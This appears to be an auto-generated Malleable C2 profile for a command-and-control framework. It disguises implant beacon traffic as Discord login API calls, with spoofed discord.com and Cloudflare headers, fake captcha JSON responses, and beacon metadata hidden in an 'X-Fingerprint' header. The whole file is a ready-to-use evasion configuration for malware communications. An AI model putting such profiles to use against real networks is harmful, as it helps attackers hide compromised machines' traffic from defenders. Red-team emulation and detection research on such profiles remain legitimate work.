
############################################################################
# Generated by Burp2Malleable - https://github.com/CodeXTF2/Burp2Malleable #     
# By: CodeX                                                                #
############################################################################
# Automatically generated with pyMalleableC2
# https://github.com/Porchetta-Industries/pyMalleableC2
#
# !!! Make sure to run this profile through c2lint before using !!!

http-get {
    set verb "POST";
    set uri "/api/v9/auth/login";
    client {
        header "Host" "discord.com";
        header "X-Super-Properties" "eyJvcyI6IldpbH0=";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36";
        metadata {
            mask;
            base64url;
            prepend "1008685949565288488.";
            append "";
            header "X-Fingerprint";
        }
    }
    server {
        output {
            mask;
            base64url;
            prepend "{'captcha_key': ['captcha-required'], 'captcha_sitekey': 'f5561";
            prepend "";
            append "";
            append "ba9-8f1e-40ca-9b5b-a0b3f719ef34', 'captcha_service': 'hcaptcha'}";
            print;
        }
        header "Date" "Mon, 15 Aug 2022 10:38:13 GMT";
        header "Content-Type" "application/json";
        header "Content-Length" "127";
        header "Connection" "close";
        header "access-control-allow-origin" "https://discord.com";
        header "access-control-allow-credentials" "true";
        header "access-control-allow-methods" "POST, GET, PUT, PATCH, DELETE";
        header "access-control-allow-headers" "Content-Type, Authorization, X-Audit-Log-Reason, X-Track, X-Super-Properties, X-Context-Properties, X-Failed-Requests, X-Fingerprint, X-RPC-Proxy, X-Discord-Locale, X-Debug-Options, x-client-trace-id, If-None-Match, Range, X-RateLimit-Precision";
        header "strict-transport-security" "max-age=31536000; includeSubDomains; preload";
        header "x-envoy-upstream-service-time" "40";
        header "Via" "1.1 google";
        header "Alt-Svc" "h3=':443'; ma=86400, h3-29=':443'; ma=86400";
        header "CF-Cache-Status" "DYNAMIC";
        header "Expect-CT" "max-age=604800, report-uri='https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct'";
        header "Report-To" "{'endpoints':[{'url':'https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=NVkTuc0Tiecsv86A00v9WwDmAGBhWkOIUSbzNAmn7bbAEuwnrV8j1%2BNMu8qkv6yLwwy6izaKGbhzvNCLUrKlKUm1mjN8L3e2qu4mjYSmMI%2Bj5mLbso23JbU1P2Ah'}],'group':'cf-nel','max_age':604800}";
        header "NEL" "{'success_fraction':0,'report_to':'cf-nel','max_age':604800}";
        header "X-Content-Type-Options" "nosniff";
        header "Server" "cloudflare";
        header "CF-RAY" "73b14ca4bbd187d8-SIN";
    }
}
http-post {
    set verb "POST";
    set uri "/API/V9/AUTH/LOGIN";
    client {
        header "Host" "discord.com";
        header "X-Super-Properties" "eyJvcyI6IldpbH0=";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36";
        id {
            mask;
            base64url;
            parameter "id";
        }
        output {
            mask;
            base64url;
            prepend "{'login':'a@a.com','password':'bsdfv','undelete':false,'cap";
            append "tcha_key':null,'login_source':null,'gift_code_sku_id':null}";
            print;
        }
    }
    server {
        output {
            mask;
            base64url;
            print;
        }
        header "Date" "Mon, 15 Aug 2022 10:38:13 GMT";
        header "Content-Type" "application/json";
        header "Content-Length" "127";
        header "Connection" "close";
        header "access-control-allow-origin" "https://discord.com";
        header "access-control-allow-credentials" "true";
        header "access-control-allow-methods" "POST, GET, PUT, PATCH, DELETE";
        header "access-control-allow-headers" "Content-Type, Authorization, X-Audit-Log-Reason, X-Track, X-Super-Properties, X-Context-Properties, X-Failed-Requests, X-Fingerprint, X-RPC-Proxy, X-Discord-Locale, X-Debug-Options, x-client-trace-id, If-None-Match, Range, X-RateLimit-Precision";
        header "strict-transport-security" "max-age=31536000; includeSubDomains; preload";
        header "x-envoy-upstream-service-time" "40";
        header "Via" "1.1 google";
        header "Alt-Svc" "h3=':443'; ma=86400, h3-29=':443'; ma=86400";
        header "CF-Cache-Status" "DYNAMIC";
        header "Expect-CT" "max-age=604800, report-uri='https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct'";
        header "Report-To" "{'endpoints':[{'url':'https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=NVkTuc0Tiecsv86A00v9WwDmAGBhWkOIUSbzNAmn7bbAEuwnrV8j1%2BNMu8qkv6yLwwy6izaKGbhzvNCLUrKlKUm1mjN8L3e2qu4mjYSmMI%2Bj5mLbso23JbU1P2Ah'}],'group':'cf-nel','max_age':604800}";
        header "NEL" "{'success_fraction':0,'report_to':'cf-nel','max_age':604800}";
        header "X-Content-Type-Options" "nosniff";
        header "Server" "cloudflare";
        header "CF-RAY" "73b14ca4bbd187d8-SIN";
    }
}
